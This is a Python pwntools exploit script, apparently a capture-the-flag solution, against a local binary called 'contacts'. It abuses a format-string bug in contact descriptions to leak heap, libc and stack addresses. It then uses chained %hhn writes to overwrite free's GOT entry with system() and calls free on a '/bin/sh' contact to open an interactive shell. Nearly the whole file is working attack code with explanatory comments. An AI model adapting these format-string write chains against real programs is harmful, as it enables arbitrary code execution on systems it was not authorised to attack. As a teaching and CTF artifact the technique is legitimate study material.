#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

from struct import pack, unpack
from functools import partial
with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	print line
	conn.sendline(line)

	with open('payload', 'a') as f:
		line += '\x0a' # fuck you :)
		f.write(line)

conn = process("./contacts_54f3188f64e548565bc1b87d7aa07427")

current_val = 0

def set_cur_val(a):
	global current_val
	gets_to_zero = 256 - current_val # add this to get to 0x00
	gets_to_destination = gets_to_zero + a # add this to get to where you want to be
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256
	current_val = a
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%1$0" + str(inc) + "c" 

def decompose_data(data):
	# 0xaabbccdd -> aabbccdd
	hexStr = hex(data)[2:][::-1] # little endian

	# aabbccdd -> [aa, bb, cc, dd]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	bytes = [int(x,16) for x in byteList]
	return bytes


def payload_write_using_offset(offset, data):
	global current_val
	bytes = decompose_data(data)
	payload = ""

	for byte in bytes:
		payload += off_write(offset, byte)

	return payload

def off_write(offset, byte):
	"""
		Use this stack addres offset, to write a byte
	"""
	global current_val
	payload = set_cur_val(byte)
	payload += "%{0}$hhn".format(offset)
	return payload

def addr_from_base_and_offset(base, offset):
	"""
		base = 0xffffd2d0, offset1 = 1
	"""
	return base + 4*offset

def write_and_prep_next(offsets, byte, next_lsb):
	"""
		|can't change|  |change LSB|  |full control|
		|____________|__|__________|__|____________|
		|   offset1  |->|  offset2 |->|  offset3   |
		____________________________________________

		use offset1 to change the LSB of offset2
		use offset2 to change all the bytes of offset3
		use offset3 to write wherever
	"""
	global current_val
	current_val = 0
	# write the current value
	payload = off_write(offsets[1], byte)
	# prepare our wiggle ninja pointer for the next format string
	payload +=off_write(offsets[0], next_lsb)

	return payload

def payload_chain(offsets, address, data):
	"""
		Requires 2 offsets and an address. i.e offsets = [6,18]

		Generate payloads that write 'data'
		to the address at offset3

		Each payload writes to offset 3 using offset 2
		and sets up offset 2 for the next one using offset 1 

		You can't do them all in the one hit because printf 
		copies things internally so it needs to be called
		multiple times. Dependant writes/reads are not ok in format exploits
	"""

	# now get it's least significant byte
	lsbAddr3 = decompose_data(address)[0]
	# shift this value along to write to the whole word

	# decompose the data into a little endian friendly list
	bytes = decompose_data(data)
	# generate a payload given these offsets
	payload = partial(write_and_prep_next, offsets=offsets[:2]) # only need first 2
	# the lsb that will be used in the next format string execution
	# needs to be postpended to the one before
	next_lsbs = [lsbAddr3 + x for x in [1,2,3,0]]
	# write to 0 + prepare second offset for write to 1
	# write to 1 + prepare second offset for write to 2
	# write to 2 + prepare second offset for write to 3
	# write to 3 + prepare second offset for write to 0 (just to neaten things up)
	arr = [payload(byte=b, next_lsb=l) for b,l in zip(bytes,next_lsbs)]

	return arr



def payload_read_addr(addr):
	payload = "" 

	# just writing the address

	payload += p32(addr)

	# this is the offset of the first address in our string
	offset = 2
	current_val = len(payload)

	payload += ":::%{0}$s:::".format(offset)

	return payload

def deref(addr):

	payload = payload_read_addr(addr)
	send(conn, payload)
	print conn.recv()
	print conn.recv()
	print conn.recv()
	conn.recvuntil(':::'),
	memoryString = conn.recvuntil(':::')[:-3] # 78243533|3633257c|257c7824| .. |:E
	conn.recv(),
	buff = []
	for char in memoryString[::-1]:
		h = hex(ord(char))[2:]
		if len(h) == 1:
			h = '0' + h
		buff.append(h)
	return buff[-4:]


# working out the offsets
def stack_run(num):
	return "%x."*num


def createContact(name, description):
	send(conn, "1")
	print conn.recvuntil("Name:")
	send(conn, name) # name
	print conn.recvuntil("Enter Phone No:")
	send(conn, "1337") # number
	print conn.recvuntil("Length of description:")
	send(conn, str(len(description))) # len of description
	print conn.recvuntil("Enter description:")
	send(conn, description)


def remove_contact(name):
	send(conn, "2")
	print conn.recvuntil('Name to remove?')
	send(name)

# menu
print conn.recvuntil('>>>')

# use the format string to leak some nice stack addresses
# 1 heap ptr
# 2 libc ptr
# 6 stack ptr
createContact("Leak", "Heap:%1$p|||Libc:%2$p:::Stack:%6$p;;; and %6$p %18$x->{{%18$s}} %30$p")
print conn.recvuntil('>>>')
send(conn, "4")
response = conn.recvuntil('>>>')
print response

heap_leak = int(response[response.index('Heap:')+5 : response.index('|||')],16)
libc_leak = int(response[response.index('Libc:')+5 : response.index(':::')],16)
stack_leak= int(response[response.index('Stack:')+6: response.index(';;;')],16)
# leak to system
# From 0xf7e59dab to 0xf7e463e0: -80331 bytes, -20083 dwords (+1 bytes)  
# and another -60248 apparently, weird
# leak to eip
# From 0xffffd318 to 0xffffd2d8: -64 bytes, -16 dwords
system = libc_leak - 20083 -60248
eip = stack_leak - 16
stack_top = stack_leak - 72
free_plt = 0x0804b014


# 6 | 0xffffd2e8 --> 0xffffd318 --> 0xffffd348 --> 0x0  <--- THIS 
# 18| 0xffffd318 --> 0xffffd348 --> 0x0  <--- AND  THIS 
# 30| 0xffffd348 --> 0
# partial function, accepts 'data' and writes it to offset 30

def setup_chain(offsets, address, data):
	for load in payload_chain(data=data, offsets=offsets, address=address):
		createContact("Hack", load) 
		print conn.recvuntil('>>>')

offset3_addr = addr_from_base_and_offset(stack_top,30)

# 6 fiddles 18 to write free_plt into 30
setup_chain([6,18],  address=offset3_addr, data=free_plt) # create the contacts
# 18 fiddles 30 to write system into free_plt
setup_chain([18,30], address=free_plt, data=system) # create the contacts

createContact("/bin/sh", "/bin/sh")
print conn.recvuntil('>>>')

print "system:" + hex(system)
send(conn, "4") # execute format string
print conn.recvuntil('>>>')
send(conn, "2") # edit 
send(conn, "/bin/sh") # edit AAAA
conn.interactive()




